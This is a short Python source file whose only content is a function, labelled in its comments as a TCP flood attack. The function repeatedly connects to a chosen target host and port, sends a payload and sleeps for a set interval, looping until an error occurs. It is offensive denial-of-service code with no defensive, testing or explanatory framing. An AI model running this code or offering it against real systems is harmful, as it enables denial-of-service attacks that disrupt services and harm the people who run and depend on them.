import logging
import socket
import time

# Set up logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')


# Function to send TCP flood attack
def send_tcp_flood(target, port, payload, interval):
    while True:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect((target, port))
                s.send(payload)
            time.sleep(interval)
        except Exception as e:
            logging.error(f"TCP Flood Error: {e}")
            break  # Exit the loop on error